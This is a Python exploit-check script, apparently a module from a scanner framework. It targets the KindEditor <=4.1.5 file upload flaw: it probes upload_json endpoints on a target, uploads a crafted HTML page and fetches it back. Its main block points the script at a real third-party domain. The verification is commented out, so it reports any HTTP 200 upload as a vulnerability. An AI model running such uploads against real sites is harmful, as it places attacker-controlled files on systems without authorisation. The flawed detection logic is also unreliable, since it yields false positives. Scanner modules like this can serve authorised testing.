#!/usr/bin/env python3

import re
from app.lib.utils.request import request
from app.lib.utils.common import get_useragent

class Upload_File_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'kindeditor 文件上传漏洞',
            'description': 'kindeditor 文件上传漏洞, 影响范围为: kindeditor<=4.1.5',
            'date': '',
            'exptype': 'check',
            'type': 'File Upload'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url 
        self.headers = {
            'User-Agent': get_useragent()
        }
        self.path = ''
        self.html_payload = '''
                        <html><head>
                        <title>Uploader</title>
                        <script src="%s/SEMCMS_PHP_3.9/Edit/kindeditor.js"></script>
                        <script>
                        KindEditor.ready(function(K) {
                        var uploadbutton = K.uploadbutton({
                        button : K('#uploadButton')[0],
                        fieldName : 'imgFile',
                        url : '%s',
                        afterUpload : function(data) {
                        if (data.error === 0) {
                        var url = K.formatUrl(data.url, 'absolute');
                        K('#url').val(url);}
                        },
                        });
                        uploadbutton.fileBox.change(function(e) {
                        uploadbutton.submit();
                        });
                        });
                        </script></head><body>
                        <div class="upload">
                        <input class="ke-input-text" type="text" id="url" value="" readonly="readonly" />
                        <input type="button" id="uploadButton" value="Upload" />
                        </div>
                        </body>
                        </html>
        ''' %(self.url, self.path)

    def check_path(self):

        """
        检测是否存在路径

        :param:

        :return bool True or False: 是否存在路径
        """

        site_type= ['/kindeditor/asp/upload_json.asp','/kindeditor/asp.net/upload_json.ashx', '/kindeditor/jsp/upload_json.jsp', '/kindeditor/php/upload_json.php','/kindeditor/examples/uploadbutton.html']
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        for url in site_type:
            check_url = self.url + url + '?dir=file'
            check = request.get(check_url, headers = self.headers)
            if check.status_code == 200:
                self.path = check_url
                return True
        return False

    def check(self):
    
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            if self.check_path():
                files = {
                    'imgFile': ('test.html', self.html_payload, 'application/octet-stream')
                }
                upload_html = request.post(self.path, headers = self.headers, files = files)
                if upload_html.status_code == 200:
                    pattern = re.compile('{"error":0,"url":"(.*?)"}')
                    #print(upload_html.text)
                    html = pattern.findall(upload_html.text)[0].replace('\\', '').split('/')
                    html_path = '/' + '/'.join(html[2:])
                    check_html = request.get(self.url + html_path, headers = self.headers)
                    '''if check_html.status_code == 200:
                        print("存在kindeditor上传漏洞")
                        return True'''
                    print("存在kindeditor上传漏洞")
                    return True
                else:
                    print("不存在kindeditor上传漏洞")
                    return False
            else:
                print("不存在kindeditor上传漏洞")
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    UPLOAD_FILE = Upload_File_BaseVerify('http://baidu.com/')
    UPLOAD_FILE.check()


